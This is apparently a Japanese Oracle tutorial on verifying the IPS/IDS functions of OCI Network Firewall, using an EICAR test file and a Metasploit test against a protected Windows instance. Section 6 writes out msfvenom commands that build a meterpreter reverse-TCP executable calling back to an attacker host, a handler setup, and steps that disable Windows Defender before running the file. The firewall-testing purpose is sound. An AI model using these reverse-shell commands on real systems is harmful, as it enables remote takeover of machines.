---
title: "OCI Network FirewallのIPS/IDS機能を検証する"
excerpt: "本チュートリアルは「OCI Network Firewallを構築する」の続編として、IPS/IDS機能の動作確認を行います"
order: "120"
layout: single
tags:
 - intermediate
header:
 teaser: "/id-security/networkfirewall/nfw1.png"
 overlay_image: "/id-security/networkfirewall/nfw1.png"
 overlay_filter: rgba(34, 66, 55, 0.7)

---

パロアルトネットワークスの次世代ファイアウォール技術を基に構築されたOCIクラウドネイティブのマネージド・ファイアウォール「OCI Network Firewall」が2022年7月にリリースされました。「OCI Network Firewall」はURLフィルタリングやTSL/SSL検査などの機能を提供します。
本チュートリアルは[OCI Network Firewallを構築する](https://oracle-japan.github.io/ocitutorials/intermediates/networkfirewall/)の続編として、IPS/IDSの設定および動作を確認します。

IPS/IDSの動作検証には、Kali LinuxのツールおよびEicarファイルを使用します。
Kali Linuxでは、Network Firewallインスタンスに保護されたWindowsのコンピュートインスタンスに侵入テストを実施します。
Eicarファイルを使用する際は、Network Firewallインスタンスに保護されたLinuxのコンピュートインスタンスにWebサーバーを構築し、Webサーバーを使用して動作を検証します。


**所要時間 :** 約60分

**前提条件 :**
+ OCIチュートリアル[OCI Network Firewallを構築する](https://oracle-japan.github.io/ocitutorials/intermediates/networkfirewall/)を参考に、Network Firewallインスタンスの作成、コンピュートインスタンス（LinuxまたはWindows）の作成が終わっていること
+ Kali Linuxを使用した動作検証を実施する場合、Windowsのコンピュートインスタンスに対して侵入テストを実施します。OCIチュートリアル[OCI Network Firewallを構築する](https://oracle-japan.github.io/ocitutorials/id-security/networkfirewall/)の手順6-2[Windowsインスタンスの作成](https://oracle-japan.github.io/ocitutorials/id-security/networkfirewall/#6-2-windows%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%82%BF%E3%83%B3%E3%82%B9%E3%81%AE%E4%BD%9C%E6%88%90)に沿って、Windowsのコンピュートインスタンスが作成されていることを確認してください。
+ Kali Linuxを使用した動作検証を実施する場合、[Kali LinuxをOCIにデプロイする](https://qiita.com/western24/items/9830d158247fd2dca60b)を参考に、OCI Network Firewallで保護されたコンピュートインスタンスに対して通信を行える環境に、Kali Linuxの構築が終わっていること。
+ Eicarファイルを使用した動作検証を実施する場合、LinuxのコンピュートインスタンスにWebサーバーをインストールして動作を検証します。OCIチュートリアル[OCI Network Firewallを構築する](https://oracle-japan.github.io/ocitutorials/id-security/networkfirewall/)の手順6-1[Linuxのコンピュート・インスタンスの作成](https://oracle-japan.github.io/ocitutorials/id-security/networkfirewall/#6-2-windows%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%82%BF%E3%83%B3%E3%82%B9%E3%81%AE%E4%BD%9C%E6%88%90)に沿って、Linuxのコンピュートインスタンスが作成されていることを確認してください。
+ **`重要`**： OCIの環境へツールなどを用いた侵入テストを実行する際は、メールにてOracleに事前に侵入テストの実施を通知する必要があります。本チュートリアルの内容を実施する際は、[クラウド・セキュリティ・テスト通知の送信](https://docs.oracle.com/ja-jp/iaas/Content/Security/Concepts/security_testing-policy_notification.htm)を参考に、事前にOracleへ告知メールを送信してください。


**注意 :**
+ ※チュートリアル内の画面ショットについてはOracle Cloud Infrastructureの現在のコンソール画面と異なっている場合があります。
+ ※本チュートリアルでは、OCI Network Firewallの機能検証を目的にKali LinuxおよびEicarファイルを使用します。ご自身の管理下にないサーバーや、本番環境に対しては使用しないでください。また、ツールを使用したことによりトラブルや損失が発生した場合についても責任を負いかねます。




# 1. ネットワーク・ファイアウォール・ポリシーの編集

## 1-1. ネットワーク・ファイアウォール・ポリシーのクローニング

OCIチュートリアル[OCI Network Firewallを構築する](https://oracle-japan.github.io/ocitutorials/intermediates/networkfirewall/)で作成したネットワーク・ファイアウォール・ポリシーの詳細画面の「ポリシーのクローニング」をクリックします。
 ![画面ショット1](nfwips1.png)


「ネットワーク・ファイアウォール・ポリシー・クローンの作成」画面にて、以下情報を入力して「次」ボタンをクリックします。
+ **`名前`** - 任意 例）NFWPolicy2
 ![画面ショット2](nfwips2.png)


<br>

## 1-2. アプリケーション・リストの追加
「リスト」の画面にて、「アプリケーション・リストの追加」ボタンをクリックします。
 
 ![画面ショット3](nfwips3.png)

「アプリケーション・リストの追加」画面にて、以下情報を入力し、「アプリケーション・リストの追加」ボタンをクリックします。
+ **`名前`** - 任意 例）others
+ **`アプリケーション・プロトコル`** - UDP/TCP
+ **`プロトコル`** - TCP
+ **`ポート範囲`** - 0-9999

 ![画面ショット4](nfwips4.png)

アプリケーション・リストを追加したら「次」ボタンをクリックします。
「マップされたシークレット/復号化プロファイル」は何も設定せず「次」ボタンをクリックします。

<br>


## 1-3. セキュリティ・ルールの作成
「ルールの画面」にて、「セキュリティ・ルールの追加」ボタンをクリックします。
 ![画面ショット5](nfwips5.png)

「セキュリティ・ルールの追加」画面にて、以下情報を入力したら「変更の保存」ボタンをクリックします。

+ **`名前`** - 任意 例）others-ips
+ **`ソースIPアドレス`** - 任意のIPアドレス
+ **`宛先IPアドレス`** - 任意のIPアドレス
+ **`アプリケーション`** - UDP/TCPを選択し、手順1-2で作成したアプリケーション・リスト「others」を選択します。
+ **`URL`** - 任意のURL
+ **`ルール・アクション`** - 「侵入防止」を選択します。
 ![画面ショット6](nfwips6.png)


セキュリティ・ルールを追加したら「次」ボタンをクリックし、「ネットワーク・ファイアウォール・ポリシーの作成」ボタンをクリックします。
 ![画面ショット7](nfwips7.png)

新しいネットワーク・ファイアウォール・ポリシーが作成されます。


<br>


# 2. Network Firewallインスタンスに割り当てられているNetwork Firewallポリシーの変更

OCIチュートリアル[OCI Network Firewallを構築する](https://oracle-japan.github.io/ocitutorials/intermediates/networkfirewall/)で作成したNetwork Firewallインスタンスの詳細画面の「編集」ボタンをクリックします。
 ![画面ショット8](nfwips8.png)

「ファイアウォールの編集」画面にて、手順1で作成したネットワーク・ファイアウォール・ポリシー「例）NFWPolicy2」を選択し、「変更の保存」ボタンをクリックします。
 ![画面ショット9](nfwips9.png)


約10分程で再びNetwork Firewallがアクティブになります。
 ![画面ショット10](nfwips10.png)


<br>


# 3. Network Firewallで保護されたコンピュートインスタンスにWebサーバをインストール（Eicarファイルを使用する場合）
本手順では、Eicarファイルを使用した動作検証を実施する場合、必要になるWebサーバーをインストールします。
OCIチュートリアル[OCI Network Firewallを構築する](https://oracle-japan.github.io/ocitutorials/intermediates/networkfirewall/)で作成したコンピュートインスタンス（Linux）にSSHでアクセスします。
ターミナルで以下コマンドを実行し、Apache HTTPサーバをインストールします。
1. Apache HTTPサーバーをインストールします

    ```sh
    sudo yum -y install httpd
    ```

2. TCPの80番(http)および443番(https)ポートをオープンします

    ```sh
    sudo firewall-cmd --permanent --add-port=80/tcp
    sudo firewall-cmd --permanent --add-port=443/tcp
    ```

3. ファイアウォールを再ロードします

    ```sh
    sudo firewall-cmd --reload
    ```

4. Webサーバーを起動します

    ```sh
    sudo systemctl start httpd
    ```

クライアントPCのブラウザを開き、「http://<コンピュートインスタンスのIPアドレス>」にアクセスし、以下のようなページが表示されることを確認します。
 
 ![画面ショット11](nfwips11.png)

<br>


# 4. Network Firewallインスタンスのログの有効化

Network Firewallインスタンスの更新が終了し、再びアクティブになったら、Network Firewallインスタンス詳細画面左下にあるリソースから「ログ」を選択します。
 ![画面ショット12](nfwips12.png)

表示された「ログの有効化」画面にて、以下情報を入力し、「ログの有効化」ボタンをクリックします。
+ **`ログ・グループ`** - 新規ログ・グループの作成を選択します。
+ **`名前`** - 任意 例）NFW_LOG
+ **`説明`** - 任意
+ **`ログ名`** - デフォルト「NFW1_threatlog」のままにします。変更したい場合は任意のログ名を入力してください。
+ **`ログの保持`** - デフォルトの1ヵ月にします。最大で6ヵ月まで保持することが可能です。
 ![画面ショット13](nfwips13.png)

<br>



# 5. Eicarファイルを用いたNetwork Firewallの動作検証

Eicarファイルは、ウイルス対策ソフトの応答をテストするために[EICAR](https://www.eicar.org/)が開発したテストファイルです。

## 5-1. Eicarファイルの配置
[Eicarのホームページ](https://www.eicar.org/download-anti-malware-testfile/)から、eicar.comファイルをクリックします。
 ![画面ショット23](nfwips23.png)

以下の文字列がブラウザ上に表示されるので、表示された文字列をクリップボードにコピーします。
 
 ![画面ショット22](nfwips22.png)

手順3でWebサーバーをインストールしたインスタンスにアクセスし、/var/www/htmlディレクトリ配下にコピーしたeicarファイルの中身をペーストします。
ここではページ名を「eicar.html」とします。
```sh
$ sudo cd /var/www/html
$ sudo vi eicar.html 
```
 ![画面ショット24](nfwips24.png)

<br>

## 5-2. Eicarファイルへアクセス

クライアントPCのブラウザを開き、以下URIにアクセスします。
```
http://<手順3でWebサーバをインストールしたインスタンスのIPアドレス>/eicar.html
```
OCI Network Firewallの侵入防止の機能によって、接続がリセットされます。

 ![画面ショット25](nfwips25.png)

<br>

## 5-3. Network Firewallのログの確認

実際にNetwork Firewallのログに、脅威情報として上記のアクセスが記録されていることを確認します。

Network Firewallインスタンスの詳細画面左下のリソース→ログ→手順4で有効化したThreat Logの「ログ名」から、ログを確認します。
 ![画面ショット26](nfwips26.png)

出力されたログから、手順1-3で作成したルール「others-ips」によって「Eicarファイルが検知」され、クライアントPCのグローバルIPアドレスからの接続がリセットされていることが分かります。
 ![画面ショット27](nfwips27.png)


<br>


# 6. Kali LinuxのMetasploit Frameworkを用いたNetwork Firewallの動作検証


本手順ではKali LinuxにインストールされているMetasploit FrameworkのReverse TCP Shellを用いて、Network Firewallに保護されたコンピュート（Windows）へ侵入テストを実施します。

今回はKali Linuxを攻撃側（クライアント）とし、Windowsサーバーに接続します。Kali LinuxのMetasploit Frameworkを用いてReverse TCP Shellを実行する実行ファイルを生成します。Kali LinuxはWindowsからの接続をListen状態で待っている際、Windowsサーバーが実行ファイルをダウンロードし、実行するとWindowsサーバーからKali Linuxへのアウトバウンド通信が発生してセッションが確立されます。

## 6-1. 実行ファイルの作成
Kali Linuxにリモートデスクトップ接続します。
 ![画面ショット28](nfwips28.png)

Kali Linuxのデスクトップ画面左上のメニューから、「Terminal Emulator」をダブルクリックで開きます。
 ![画面ショット29](nfwips29.png)

以下コマンドを実行し、攻撃実行ファイルを生成します。
```sh
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali LinuxのIPアドレス> LPORT=4444 -f exe -o <ファイルを生成するディレクトリ>/<ファイル名>
```

例えば以下コマンドでは、/home/debian/Desktopにrs_exploit1.exeファイルが生成されます。
```sh
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali LinuxのIPアドレス> LPORT=4444 -f exe -o /home/debian/Desktop/rs_exploit1.exe
```
 ![画面ショット30](nfwips30.png)

Kali Linuxのデスクトップ画面左上のメニューから「Metasploit framework」を検索し、アプリをダブルクリックしてターミナルを開きます。
 ![画面ショット31](nfwips31.png)

開かれたターミナルで、以下コマンドを実行します。
```sh
msf6> use exploit/multi/handler
msf6 exploit(multi/handler)> set LHOST <Kali LinuxのIPアドレス>
msf6 exploit(multi/handler)> set LPORT 4444
msf6 exploit(multi/handler)> exploit
```
 ![画面ショット32](nfwips32.png)

この状態で、先程生成したファイルWindowsサーバーが実行したら、WindowsサーバーからKali Linuxへアウトバウンド通信が発生し、Kali LinuxからWindowsサーバーに対して任意のコマンドを実行することが出来るようになります。

<br>

## 6-2. Windowsサーバーで実行ファイルのダウンロードと実行

今回は、Network Firewallによって保護されたWindowsのインスタンスからファイルをダウンロードし、実行します。しかし、Network FirewallのIPSの機能によってファイルの実行が妨げられ、クライアントとKali Linux間の接続がリセットされることを確認します。

まずは実行ファイルをクライアントがダウンロードできるよう、ファイルをKali Linuxの/var/www/htmlディレクトリ配下にコピーします。
※Kali LinuxにはWebサーバーがデフォルトでインストールされています。
```sh
$ sudo cp rs_exploit1.exe /var/www/html
```
 ![画面ショット33](nfwips33.png)


続いて、OCIチュートリアル[OCI Network Firewallを構築する](https://oracle-japan.github.io/ocitutorials/id-security/networkfirewall/)の手順6-2[Windowsインスタンスの作成](https://oracle-japan.github.io/ocitutorials/id-security/networkfirewall/#6-2-windows%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%82%BF%E3%83%B3%E3%82%B9%E3%81%AE%E4%BD%9C%E6%88%90)で作成したWindowsのコンピュートインスタンスにリモートデスクトップ接続をします。
デスクトップのメニューからServer Managerを開きます。
 ![画面ショット34](nfwips34.png)

Local Server → Windows Defende AntivirusのReal-Time Protection:Onを選択します。
※合わせてIE Enfances Security ConfigurationがOffになっていることも確認してください。Onになっている場合、Offに変更してください。
 ![画面ショット35](nfwips35.png)

表示されたポップアップ画面にて、「Real-time protection」と、「Cloud-delivered protection」をOffにします。
 ![画面ショット36](nfwips36.png)

続いてInternet Explorerを開き、以下URIにアクセスすると、ファイルが自動的にダウンロードされ、ファイルを実行するか確認されます。
```
http://<Kali LinuxのIPアドレス>/rs_exploit.exe
```
ファイルの「Run」ボタンをクリックします。
 ![画面ショット37](nfwips37.png)

警告メッセージが表示された場合は、もう一度「Run」ボタンをクリックします。そうするとNetwork Firewallによってファイルの実行が遮断されます。
 ![画面ショット38](nfwips38.png)

Kali LinuxのMetasploit Frameworkでexploitコマンドを実行しているターミナルにも何も表示されていないので、実行は失敗していることが分かります。
 ![画面ショット39](nfwips39.png)

<br>

## 6-3. Network Firewallのログの確認

実際にNetwork Firewallのログに、脅威情報として上記のアクセスが記録されていることを確認します。
Network Firewallインスタンスの詳細画面左下のリソース→ログ→手順4で有効化したThreat Logの「ログ名」から、ログを確認します。
 ![画面ショット26](nfwips26.png)


手順1-3で作成したルール「others-ips」によって「TCP Shell Command」が検出され、WindowsのコンピュートインスタンスのプライベートIPアドレスからKali LinuxのパブリックIPアドレスに対して不正に発生している通信をNetwork Firewallがリセットしていることが分かります。
 ![画面ショット40](nfwips40.png)


以上で、Kali LinuxのMetasploit Frameworkを用いたNetwork Firewallの動作検証は終了です。

<br>

## 6-4. 補足1：攻撃が成功した場合
Network Firewallによって保護されていないWindowsのインスタンスで同様にファイルをダウンロードして実行すると、WindowsインスタンスとKali Linux間のセッションが確立します。
Kali LinuxからはWindowsインスタンスに対してコマンドを実行することが出来るようになります。
 ![画面ショット41](nfwips41.png)


## 6-5. 補足2：IDSの場合

手順1-3で追加するセキュリティ・ルールのルール・アクションを「侵入防止」ではなく、「侵入検知」にすると、以下のような内容のThreat Logが出力されます。
 
 ![画面ショット](nfwips42.png)

WindowsサーバーのプライベートIPアドレスから、Kali LinuxのパブリックIPアドレスに対して通信が発生していることをアラートとして検知しています。
